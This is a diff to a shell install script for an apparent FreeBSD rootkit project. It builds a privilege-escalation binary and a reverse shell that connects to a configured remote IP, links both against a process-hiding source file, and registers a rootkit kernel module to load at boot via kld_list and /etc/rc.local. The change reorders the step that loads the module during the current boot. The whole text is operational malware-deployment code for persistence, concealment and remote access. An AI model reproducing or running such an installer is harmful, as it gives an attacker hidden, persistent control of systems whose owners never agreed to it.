@@ -40,13 +40,13 @@ make -C "$MODULE_DIR"
 [ -f "$MODULE_FILE" ]
 
 # Build elevate
-cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"
+cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" "$MODULE_DIR/proc_hiding.c"
 
 # Build revshell inside $MODULE_DIR.  The reverse-shell half of the project is
 # optional: if the sources are not shipped, skip them instead of aborting the
 # whole install (which would also stop the log sender from being installed).
 if [ -f "$MODULE_DIR/revshell.c" ]; then
-    cc -Wall -Wextra -DDEFAULT_REMOTE_IP="\"$REMOTE_IP\"" -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" || fail "Failed to build revshell"
+    cc -Wall -Wextra -DDEFAULT_REMOTE_IP="\"$REMOTE_IP\"" -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" "$MODULE_DIR/proc_hiding.c" || fail "Failed to build revshell"
     chmod 755 "$MODULE_DIR/revshell"
 fi
 
@@ -68,15 +68,6 @@ install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"
 # Add rootkit to kld_list without duplicating existing entries
 sysrc kld_list+=rootkit >/dev/null
 
-
-# Load it during the current boot
-if [ "$MODULE_LOADED" = false ]; then
-    kldload "$PERSISTENCE_FILE"
-
-    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
-        exit 1
-    fi
-fi
 
 # Verify elevate was built successfully
 [ -f "$ELEVATE_BIN" ]
@@ -148,5 +139,12 @@ chmod +x /etc/rc.local
 if ! grep -q "hide_kld" /etc/rc.local; then
     echo "$ABS_PATH &" >> /etc/rc.local
 fi
+# Load it during the current boot
+if [ "$MODULE_LOADED" = false ]; then
+    kldload "$PERSISTENCE_FILE"
 
+    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
+        exit 1
+    fi
+fi
 "$ABS_PATH" &
